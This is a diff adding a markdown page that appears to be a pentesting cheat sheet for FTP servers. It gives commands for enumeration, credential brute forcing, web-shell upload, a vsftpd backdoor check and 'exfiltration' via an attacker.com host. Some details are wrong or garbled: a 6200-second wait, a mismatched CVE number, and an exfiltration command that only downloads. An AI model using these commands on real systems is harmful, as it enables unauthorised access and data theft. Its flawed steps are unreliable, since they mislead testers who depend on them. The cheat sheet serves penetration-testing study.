@@ -1,0 +1,475 @@
+---
+title: "21: FTP"
+date: 2026-01-08T16:06:28-08:00
+draft: false
+description: "Pentesting FTP (File Transfer Protocol)"
+noindex: false
+featured: false
+pinned: false
+toc: true
+# comments: false
+series:
+#  - 
+categories:
+#  - 
+tags:
+#  - 
+images:
+#  - 
+# menu:
+#   main:
+#     weight: 100
+#     params:
+#       icon:
+#         vendor: bs
+#         name: book
+#         color: '#e24d0e'
+meta:
+  reading_time: false
+---
+
+FTP (File Transfer Protocol) runs on port 21 and is commonly used for file transfers. FTP servers often contain misconfigurations, default credentials, or vulnerabilities that can lead to unauthorized access and data exposure.
+
+## Enumeration
+
+### Banner Grabbing
+
+**Netcat:**
+```shell
+nc $RHOST 21
+echo "QUIT" | nc $RHOST 21
+```
+
+\
+**Telnet:**
+```shell
+telnet $RHOST 21
+```
+
+\
+**Banner extraction:**
+```shell
+timeout 3 nc $RHOST 21 2>/dev/null
+```
+
+### Version Detection
+
+**Nmap service scan:**
+```shell
+nmap -sV -p 21 $RHOST
+nmap -sC -sV -p 21 $RHOST
+```
+
+### Nmap FTP Scripts
+
+**Default safe scripts:**
+```shell
+nmap --script "ftp-* and safe" -p 21 $RHOST
+```
+
+\
+**All FTP scripts:**
+```shell
+nmap --script ftp-* -p 21 $RHOST
+```
+
+\
+**Common enumeration scripts:**
+```shell
+nmap --script ftp-anon,ftp-bounce,ftp-syst -p 21 $RHOST
+```
+
+\
+**Vulnerability detection:**
+```shell
+nmap --script ftp-vuln-* -p 21 $RHOST
+```
+
+---
+
+## Anonymous Access
+
+Many FTP servers allow anonymous access with username `anonymous` or `ftp` and any password (often `anonymous@`, empty, or email).
+
+### Manual Testing
+
+```shell
+ftp $RHOST
+# Username: anonymous
+# Password: anonymous@ (or empty)
+```
+
+### Automated Testing
+
+**Nmap:**
+```shell
+nmap --script ftp-anon -p 21 $RHOST
+```
+
+\
+**Metasploit:**
+```shell
+msfconsole
+use auxiliary/scanner/ftp/anonymous
+set RHOSTS $RHOST
+run
+```
+
+### Anonymous Access Actions
+
+Once connected with anonymous access:
+
+```shell
+# List files
+ls -la
+
+# Download file
+get filename.txt
+
+# Upload file (if allowed)
+put test.txt
+
+# Change directory
+cd /pub
+
+# Check current directory
+pwd
+
+# Check system info
+syst
+```
+
+---
+
+## Default Credentials
+
+Common default FTP credentials to test:
+
+**Common combinations:**
+- `admin:admin`
+- `administrator:password`
+- `ftp:ftp`
+- `user:user`
+- `root:root`
+- `guest:guest`
+- `test:test`
+
+\
+**Vendor-specific defaults:**
+- **vsftpd**: `ftp:ftp` (if anonymous enabled)
+- **ProFTPd**: `ftp:ftp`
+- **FileZilla**: Check server documentation
+- **IIS FTP**: Often uses Windows domain credentials
+
+### Credential Brute-forcing
+
+**Hydra:**
+```shell
+hydra -L users.txt -P passwords.txt ftp://$RHOST
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://$RHOST
+```
+
+\
+**Ncrack:**
+```shell
+ncrack -p 21 -U users.txt -P passwords.txt $RHOST
+```
+
+\
+**Medusa:**
+```shell
+medusa -h $RHOST -u admin -P passwords.txt -M ftp
+```
+
+---
+
+## FTP Commands
+
+### Basic Connection
+
+```shell
+# Interactive mode
+ftp $RHOST
+
+# Command line mode
+ftp -n $RHOST << EOF
+user username password
+binary
+get file.txt
+quit
+EOF
+```
+
+### Common FTP Commands
+
+```shell
+# Passive mode (for firewall traversal)
+passive
+
+# Active vs Passive mode
+passive on   # Passive mode (default in most clients)
+passive off  # Active mode
+
+# File transfer type
+ascii    # Text files
+binary   # Binary files (images, executables)
+
+# Directory operations
+ls -la              # List files
+cd /path            # Change directory
+pwd                 # Print working directory
+mkdir dirname       # Create directory
+rmdir dirname       # Remove directory
+
+# File operations
+get filename        # Download file
+mget *.txt          # Download multiple files
+put filename        # Upload file
+mput *.txt          # Upload multiple files
+delete filename     # Delete file
+mdelete *.txt       # Delete multiple files
+rename old new      # Rename file
+
+# System information
+syst                # System type
+stat                # Server status
+help                # List commands
+```
+
+---
+
+## Vulnerabilities
+
+### FTP Bounce Attack
+
+Exploit FTP servers that allow connections to arbitrary hosts (rare in modern servers).
+
+```shell
+# Test for bounce capability
+ftp $RHOST
+# After login:
+quote PORT 127,0,0,1,0,80
+quote LIST
+```
+
+\
+**Nmap bounce scan:**
+```shell
+nmap -b $RHOST -p 21,80
+```
+
+>[!warning] **Note**: Modern FTP servers typically disable bounce attacks by default. This vulnerability is rare.
+
+
+### User Enumeration
+
+Some FTP servers reveal whether usernames exist through different error messages.
+
+```shell
+# Try invalid password with real username
+ftp $RHOST
+Username: admin
+Password: invalidpass
+```
+
+\
+Compare error messages:
+- **530 Login incorrect:** may indicate valid username
+- **530 Invalid user:** indicates invalid username
+
+
+### Path Traversal
+
+Test for directory traversal vulnerabilities:
+
+```shell
+ftp $RHOST
+cd ../../../
+pwd
+ls -la
+```
+
+### Weak Encryption (FTPS)
+
+**Test SSL/TLS configuration:**
+```shell
+openssl s_client -connect $RHOST:21 -starttls ftp
+nmap --script ssl-* -p 21 $RHOST
+```
+
+---
+
+## File Operations
+
+### Download Files
+
+**Using ftp client:**
+```shell
+ftp $RHOST
+binary
+get config.txt
+mget *.conf
+```
+
+\
+**Using wget:**
+```shell
+wget ftp://user:pass@$RHOST/file.txt
+wget --ftp-user=user --ftp-password=pass ftp://$RHOST/file.txt
+wget -r ftp://user:pass@$RHOST/
+```
+
+\
+**Using curl:**
+```shell
+curl ftp://user:pass@$RHOST/file.txt -o output.txt
+curl ftp://user:pass@$RHOST/ -l
+```
+
+### Upload Files
+
+**Using ftp client:**
+```shell
+ftp $RHOST
+binary
+put shell.php
+put /path/to/local/file.txt remote/file.txt
+```
+
+\
+**Using curl:**
+```shell
+curl -T file.txt ftp://user:pass@$RHOST/
+curl -T file.txt ftp://user:pass@$RHOST/uploads/file.txt
+```
+
+\
+**Using wget (reverse):**
+```shell
+# Note: wget doesn't support uploads, use curl or ftp client
+```
+
+### Recursive Operations
+
+**Download entire directory:**
+```shell
+wget -r ftp://user:pass@$RHOST/path/
+```
+
+\
+**Mirror directory:**
+```shell
+wget -m ftp://user:pass@$RHOST/
+```
+
+---
+
+## Passive vs Active Mode
+
+FTP uses two modes for data connections:
+
+### Passive Mode (PASV)
+
+- Client initiates both control and data connections
+- Better for firewalls/NAT
+- Default in most modern clients
+- Server opens data port (typically >1024)
+
+\
+**Test passive mode:**
+```shell
+ftp $RHOST
+passive
+ls
+```
+
+### Active Mode (PORT)
+
+- Client opens data port and tells server
+- Server connects back to client
+- Often blocked by firewalls
+- Legacy mode
+
+\
+**Test active mode:**
+```shell
+ftp $RHOST
+passive off
+ls
+```
+
+---
+
+## Common FTP Servers
+
+### vsftpd
+
+**Version detection:**
+```shell
+nmap -sV -p 21 $RHOST | grep vsftpd
+```
+
+\
+**Known vulnerabilities:**
+- CVE-2011-0762 (backdoor in 2.3.4)
+- CVE-2015-1419 (stack overflow)
+
+\
+**Check for backdoor:**
+```shell
+echo 'USER test:)'
+echo 'PASS test'
+# Wait 6200 seconds for shell on port 6200
+nc $RHOST 6200
+```
+
+### ProFTPd
+
+**Version detection:**
+```shell
+nmap -sV -p 21 $RHOST | grep ProFTPd
+```
+
+\
+**Mod_copy vulnerability (CVE-2015-3306):**
+```shell
+# Test for mod_copy module
+# Allows copying files without proper authorization
+```
+
+### FileZilla Server
+
+**Version detection:**
+```shell
+nmap -sV -p 21 $RHOST | grep FileZilla
+```
+
+---
+
+## Data Exfiltration
+
+### Exfiltrate Files
+
+**Via wget from target:**
+```shell
+# If you have web shell or RCE
+wget --ftp-user=user --ftp-password=pass ftp://attacker.com/file.txt
+```
+
+### Search for Sensitive Files
+
+Common files to look for:
+- Configuration files (`config.php`, `.env`, `web.config`)
+- Backup files (`*.bak`, `*.backup`, `*.old`)
+- Log files (`access.log`, `error.log`)
+- Database files (`*.db`, `*.sql`)
+- SSH keys (`id_rsa`, `id_dsa`)
+
+\
+```shell
+ftp $RHOST
+# Search for common files
+mget *.conf
+mget *.bak
+mget *.log
+```
